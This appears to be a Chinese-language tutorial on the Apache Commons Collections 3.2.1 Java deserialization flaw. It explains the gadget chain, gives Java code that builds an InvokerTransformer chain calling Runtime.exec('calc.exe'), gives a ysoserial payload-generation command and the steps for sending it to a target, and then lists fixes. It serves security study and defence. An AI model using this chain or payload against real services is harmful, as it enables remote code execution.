
## 目录
1. [漏洞概述](#漏洞概述)
2. [环境复现](#环境复现)
3. [核心概念与关键类](#核心概念与关键类)
4. [漏洞原理与利用链](#漏洞原理与利用链)
5. [漏洞复现步骤](#漏洞复现步骤)
6. [修复方案](#修复方案)
7. [法律声明](#法律声明)

---

## 漏洞概述

### 基本信息
- **漏洞编号**：无独立CVE编号，但影响广泛（如WebLogic、WebSphere等）  
- **发现时间**：2015年1月28日（Gabriel Lawrence和Chris Frohoff）  
- **影响版本**：Apache Commons Collections ≤ 3.2.1  
- **利用工具**：[ysoserial](https://github.com/frohoff/ysoserial)  

### 漏洞背景
- **核心问题**：利用`InvokerTransformer`类的反射机制，构造恶意序列化数据，触发任意代码执行。  
- **关键类**：  
  - `InvokerTransformer`、`ChainedTransformer`、`TransformedMap`、`AnnotationInvocationHandler`  

---

## 环境复现

### 环境要求
- **JDK版本**：1.7.0_80（需与漏洞兼容）  
- **开发工具**：IDEA（需配置Java 7编译环境）  
- **依赖库**：Apache Commons Collections ≤ 3.2.1  

### Maven依赖配置
```xml
<dependency>
    <groupId>commons-collections</groupId>
    <artifactId>commons-collections</artifactId>
    <version>3.1</version>
</dependency>
```

---

## 核心概念与关键类

### Apache Commons Collections 扩展功能
- **集合增强**：提供`Bag`、`BidiMap`、`TransformedMap`等高级数据结构。  
- **Transformer接口**：支持对集合元素进行动态转换。  

### 关键类解析
| **类名**             | **作用**                                                                 |
|----------------------|-------------------------------------------------------------------------|
| `InvokerTransformer` | 通过反射调用任意方法（如`Runtime.exec()`）                               |
| `ChainedTransformer` | 链式调用多个`Transformer`，依次执行转换操作                               |
| `TransformedMap`     | 对Map的修改操作（如`put`、`setValue`）触发`Transformer`的`transform()`方法 |
| `AnnotationInvocationHandler` | 反序列化时触发`TransformedMap`的`setValue()`方法                         |

---

## 漏洞原理与利用链

### 漏洞触发流程
```mermaid
graph LR
  A[构造恶意序列化数据] --> B[触发AnnotationInvocationHandler.readObject()]
  B --> C[调用TransformedMap.setValue()]
  C --> D[触发ChainedTransformer.transform()]
  D --> E[执行InvokerTransformer反射调用Runtime.exec()]
```

### 关键代码逻辑
8. **构造`InvokerTransformer`链**：  
   ```java
   Transformer[] transformers = new Transformer[]{
       new ConstantTransformer(Runtime.class),
       new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
       new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
       new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})
   };
   ChainedTransformer chain = new ChainedTransformer(transformers);
   ```

9. **绑定到`TransformedMap`**：  
   ```java
   Map innerMap = new HashMap();
   Map transformedMap = TransformedMap.decorate(innerMap, null, chain);
   ```

10. **触发反序列化**：  
   ```java
   Constructor handlerConstructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler")
       .getDeclaredConstructor(Class.class, Map.class);
   handlerConstructor.setAccessible(true);
   Object handler = handlerConstructor.newInstance(Target.class, transformedMap);
   ```

---

## 漏洞复现步骤

### 步骤概览
11. **生成Payload**：使用`ysoserial`生成恶意序列化数据。  
   ```bash
   java -jar ysoserial.jar CommonsCollections1 "calc.exe" > payload.bin
   ```

12. **发送Payload**：通过HTTP请求或其他方式将`payload.bin`发送至目标服务。  

13. **触发漏洞**：目标服务反序列化时执行`calc.exe`（或其他命令）。  

---

## 修复方案

### 官方修复
14. **升级依赖库**：  
   - Apache Commons Collections ≥ 3.2.2（修复了危险`Transformer`类）。  
15. **代码层防护**：  
   ```java
   // 禁用危险类的反序列化
   System.setProperty("org.apache.commons.collections.enableUnsafeSerialization", "false");
   ```

### 临时缓解
- **JVM参数限制**：  
  ```bash
  -Djdk.serialFilter=!org.apache.commons.collections.functors.InvokerTransformer
  ```

---

## 法律声明
> **《中华人民共和国网络安全法》第二十七条**  
> 任何个人和组织不得从事非法侵入他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动；不得提供专门用于从事侵入网络、干扰网络正常功能及防护措施、窃取网络数据等危害网络安全活动的程序、工具；明知他人从事危害网络安全的活动的，不得为其提供技术支持、广告推广、支付结算等帮助。  
> **本文档内容仅用于安全研究与防御技术学习，严禁用于非法用途！**
```